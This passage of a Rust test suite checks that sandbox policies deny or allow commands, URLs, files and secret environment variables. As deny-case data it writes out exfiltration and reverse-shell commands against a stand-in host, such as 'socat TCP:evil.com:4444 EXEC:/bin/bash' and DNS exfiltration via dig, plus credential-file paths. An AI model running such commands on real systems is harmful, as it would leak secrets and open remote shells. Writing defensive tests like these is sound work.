    }

    #[test]
    fn test_pypi_install_allows_git_command() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_execution("git");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_blocks_curl_command() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_execution("curl");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_warns_python_os_system() {
        let engine = pypi_install_engine();
        let d = engine.evaluate_function(Runtime::Python, "os.system", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.mode, EnforcementMode::Warn);
    }

    #[test]
    fn test_pypi_install_warns_python_subprocess() {
        let engine = pypi_install_engine();
        let d = engine.evaluate_function(Runtime::Python, "subprocess.Popen", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.mode, EnforcementMode::Warn);
    }

    #[test]
    fn test_pypi_install_blocks_python_ctypes() {
        let engine = pypi_install_engine();
        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_allows_python_open() {
        let engine = pypi_install_engine();
        let d = engine.evaluate_function(Runtime::Python, "open", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_allows_python_socket() {
        let engine = pypi_install_engine();
        let d = engine.evaluate_function(Runtime::Python, "socket.create_connection", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // comfyui: additional base coverage tests
    // =====================================================================

    #[test]
    fn test_comfyui_blocks_cloud_metadata() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_kube_config() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("*/.kube/config");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_native_getpass_crypt() {
        let engine = comfyui_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_warns_symbols() {
        let engine = comfyui_engine();

        // symbols: warn: [getpass, crypt, keyring, symlink, link, syscall] — Warn mode, not Block
        for sym in &["getpass", "crypt", "keyring", "symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
            assert_eq!(
                d.section_mode(),
                EnforcementMode::Warn,
                "{} should be Warn mode",
                sym
            );
        }

        // Network symbols NOT in policy — allowed (network allowlist handles via HTTP hooks)
        let d = engine.evaluate_native_function("connect", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_blocks_anti_tracing_envvars() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_hf_config_envvar_allowed() {
        let engine = comfyui_engine();

        // HF config flags match *TOKEN* deny but are overridden by explicit allow
        let d = engine.evaluate_envvar("HF_HUB_DISABLE_IMPLICIT_TOKEN");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("HF_TOKEN_PATH");
        assert_eq!(d.action, PolicyAction::Allow);

        // HF_HUB_* glob allows other HF hub config flags
        let d = engine.evaluate_envvar("HF_HUB_OFFLINE");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_hf_token_still_denied() {
        let engine = comfyui_engine();

        // HF_TOKEN is the actual secret — still blocked
        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    // =====================================================================
    // air-gap policy tests
    // =====================================================================

    fn air_gap_engine() -> PolicyEngine {
        let yaml = embedded_policy("air-gap").expect("air-gap policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("air-gap policy must parse")
    }

    #[test]
    fn test_air_gap_policy_parses() {
        let engine = air_gap_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_air_gap_blocks_all_domains() {
        let engine = air_gap_engine();

        let d = engine.evaluate_domain("evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("localhost");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("169.254.169.254");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("internal.corp.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_urls() {
        let engine = air_gap_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_endpoints() {
        let engine = air_gap_engine();

        let d = engine.evaluate_endpoint("evil.com", 443);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("127.0.0.1", 8080);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("localhost", 22);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_network_commands() {
        let engine = air_gap_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp file user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("sudo iptables -F");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ip addr show");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ifconfig eth0");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_allows_non_network_commands() {
        let engine = air_gap_engine();

        let d = engine.evaluate_execution("ls -la");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cat /etc/hostname");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("echo hello");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_files_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_base_envvars_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_symbols_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("socket", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("connect", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("sendto", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("getaddrinfo", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("bind", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // openclaw detection + policy tests
    // =====================================================================

    fn openclaw_engine() -> PolicyEngine {
        let yaml = embedded_policy("openclaw").expect("openclaw policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("openclaw policy must parse")
    }

    #[test]
    fn test_openclaw_policy_parses() {
        let engine = openclaw_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_openclaw_nodejs_eval_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "eval", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Node, "vm.runInContext", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "vm.compileFunction", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.exec", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.execSync", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_nodejs_networking_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "net.connect", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "net.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "http.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "fetch", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("python3 -c 'import os'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'system(\"ls\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("base64 /etc/passwd");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_commands_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("node server.js");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git status");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("npm install express");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("docker run nginx");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ssh user@gateway.example.com");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ffmpeg -i input.ogg output.mp3");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sh -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_execution("bash -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_commands_reviewed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sudo coredns");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_openclaw_cloud_metadata_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_ai_and_chat_apis_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "https://api.anthropic.com/v1/messages",
            "api.anthropic.com/v1/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.openai.com/v1/chat/completions",
            "api.openai.com/v1/chat/completions",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://slack.com/api/chat.postMessage",
            "slack.com/api/chat.postMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.telegram.org/bot123/sendMessage",
            "api.telegram.org/bot123/sendMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://discord.com/api/v10/channels/123/messages",
            "discord.com/api/v10/channels/123/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_localhost_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("http://127.0.0.1:3000/health", "127.0.0.1:3000/health");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url("http://localhost:8080/api", "localhost:8080/api");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_unlisted_domains_denied() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_protocols_restricted() {
        let engine = openclaw_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_credential_files_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/config.json");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_hard_secrets_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_legitimate_keys_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("CLAUDE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("OPENCLAW_PORT");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_normal_envvars_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("NODE_ENV");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_anti_tracing_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_native_getpass_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_blocks_filesystem_bypass_symbols() {
        let engine = openclaw_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }
}
